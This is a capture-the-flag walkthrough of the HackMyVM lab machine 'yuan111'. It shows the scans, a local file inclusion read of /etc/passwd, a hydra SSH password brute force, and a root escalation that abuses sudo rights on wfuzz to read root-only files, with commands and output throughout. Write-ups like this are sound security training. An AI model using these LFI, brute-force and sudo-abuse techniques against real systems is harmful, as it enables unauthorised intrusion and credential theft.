# yuan111

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| yuan111 | LingMj | Beginner | HackMyVM |

**Summary:** The yuan111 machine is a beginner-level Linux CTF challenge. The attack chain begins with network reconnaissance identifying an Apache web server and an OpenSSH service. Web enumeration reveals a PHP file vulnerable to Local File Inclusion (LFI), which exposes a valid username. A subsequent dictionary attack on the SSH service provides initial access. Privilege escalation is achieved by exploiting a misconfigured sudo capability for the `wfuzz` utility, allowing the attacker to enumerate and read sensitive files from the root directory, ultimately retrieving the root password and flag.

---

## Reconnaissance

The initial phase involved scanning the local network to identify the target machine.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.118 08:00:27:92:61:9E VirtualBox
```

With the target IP identified as `192.168.100.118`, a comprehensive Nmap scan was performed to enumerate open ports and services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan111]
└─$ nmap -sC -sV -p- -T4 192.168.100.118
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-18 22:27 WIB
Nmap scan report for 192.168.100.118
Host is up (0.0022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Rockyou.txt - \xE5\xAF\x86\xE7\xA0\x81\xE5\xAD\x97\xE5\x85\xB8\xE6\x96\x87\xE4\xBB\xB6\xE4\xBB\x8B\xE7\xBB\x8D
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.40 seconds
```

The scan revealed two open ports:
- **22 (SSH)**: OpenSSH 8.4p1
- **80 (HTTP)**: Apache httpd 2.4.62

Visiting the web server on port 80 showed a page referencing "Rockyou.txt" in the title, hinting at a potential password cracking scenario.

![](image.png)

## Vulnerability Discovery

To discover hidden paths, directory brute-forcing was conducted using `feroxbuster`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan111]
└─$ feroxbuster -u http://192.168.100.118/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,bak,pem,zip,html,js,

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.118/
 🚩  In-Scope Url          │ 192.168.100.118
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, bak, pem, zip, html, js, ]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      554l     1122w    20592c http://192.168.100.118/
200      GET      554l     1122w    20592c http://192.168.100.118/index.html
200      GET        0l        0w        0c http://192.168.100.118/file.php
```

The scan identified `file.php`, which returned an empty 200 OK response. This filename often suggests file processing or inclusion capabilities. To test for Local File Inclusion (LFI), parameter fuzzing was performed using `ffuf` to identify the correct query parameter.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan111]
└─$ ffuf -u 'http://192.168.100.118/file.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.118/file.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

file                    [Status: 200, Size: 1386, Words: 13, Lines: 27, Duration: 15ms]
:: Progress: [6453/6453] :: Job [1/1] :: 1818 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

The fuzzer successfully identified the `file` parameter.

## Initial Access

Exploiting the LFI vulnerability allowed reading the `/etc/passwd` file, revealing a user named `tao`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan111]
└─$ curl "http://192.168.100.118/file.php?file=/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
tao:x:1000:1000:,,,:/home/tao:/bin/bash
```

With the username `tao` and the earlier hint about "Rockyou.txt", a brute-force attack was launched against the SSH service using `hydra`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan111]
└─$ hydra -l tao -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.118 -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-18 22:36:15
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://192.168.100.118:22/
[22][ssh] host: 192.168.100.118   login: tao   password: r[REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-18 22:36:25
```

The password was successfully found. We then logged in via SSH and retrieved the user flag.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan111]
└─$ ssh tao@192.168.100.118
...
tao@192.168.100.118's password:
Linux 111 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
...
tao@111:~$ id
uid=1000(tao) gid=1000(tao) groups=1000(tao)
tao@111:~$ ls -la
total 28
drwxr-xr-x 3 tao  tao  4096 Jan  7 06:54 .
drwxr-xr-x 3 root root 4096 Jan  7 06:40 ..
lrwxrwxrwx 1 root root    9 Jan  7 06:54 .bash_history -> /dev/null
-rw-r--r-- 1 tao  tao   220 Jan  7 06:40 .bash_logout
-rw-r--r-- 1 tao  tao  3526 Jan  7 06:40 .bashrc
drwxr-xr-x 3 tao  tao  4096 Jan  7 06:48 .config
-rw-r--r-- 1 tao  tao   807 Jan  7 06:40 .profile
-rw-r--r-- 1 root root   44 Jan  7 06:54 user.txt
```

## Privilege Escalation

Enumerating sudo privileges revealed that `tao` could run `wfuzz` as root without a password.

```bash
tao@111:~/.config/wfuzz$ sudo -l
Matching Defaults entries for tao on 111:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tao may run the following commands on 111:
    (ALL) NOPASSWD: /usr/bin/wfuzz
    (ALL) NOPASSWD: /usr/bin/id
```

`wfuzz` allows using iterators to generate payloads. The `dirwalk` iterator can be used to list files in a directory. We used this to list the contents of `/root`.

```bash
tao@111:~/.config/wfuzz$ sudo /usr/bin/wfuzz -z dirwalk,/root -u http://localhost/FUZZ 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://localhost/FUZZ
Total requests: <<unknown>>

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   404        9 L      31 W       271 Ch      "root.txt"
000000003:   404        9 L      31 W       271 Ch      ".bash_history"
000000006:   404        9 L      31 W       271 Ch      ".viminfo"
000000005:   404        9 L      31 W       271 Ch      ".profile"
000000002:   404        9 L      31 W       271 Ch      ".bashrc"
...
000000004:   404        9 L      31 W       271 Ch      "111.txt"
...
```

The output revealed a suspicious file named `111.txt` inside `/root`. Since `wfuzz` can also use a `file` iterator to read content line by line as payloads, we abused this to read `111.txt`. By setting the fuzzing payload to the file content, the "Payload" column in the output displays the lines from the file.

```bash
tao@111:~/.config/wfuzz$ sudo /usr/bin/wfuzz -z file,/root/111.txt -u http://localhost/FUZZ 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://localhost/FUZZ
Total requests: 1

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   404        9 L      31 W       271 Ch      "q6I[REDACTED]"

Total time: 0
Processed Requests: 1
Filtered Requests: 0
Requests/sec.: 0
```

The payload column contained a string that appeared to be the root password. Using this password, we switched to the root user.

```bash
tao@111:~/.config/wfuzz$ su - root
Password:
root@111:~# id
uid=0(root) gid=0(root) groups=0(root)
root@111:~# whoami
root
root@111:~# hostname
111
root@111:~# cat /home/tao/user.txt /root/root.txt
flag{user-217[REDACTED]}
flag{root-9bb[REDACTED]}
```

---

## Attack Chain Summary
1. **Reconnaissance**: Discovered open ports 22 (SSH) and 80 (HTTP) via Nmap.
2. **Vulnerability Discovery**: Found `file.php` via `feroxbuster` and identified an LFI vulnerability using `ffuf` to fuzz parameters (`file.php?file=/etc/passwd`).
3. **Exploitation**: Extracted the username `tao` from `/etc/passwd`.
4. **Initial Access**: Brute-forced the SSH password for user `tao` using `hydra` and `rockyou.txt`.
5. **Privilege Escalation**: Abused `sudo` privileges on `/usr/bin/wfuzz`. Used the `dirwalk` iterator to list `/root` (finding `111.txt`) and the `file` iterator to read `111.txt`, extracting the root password to gain full root access.
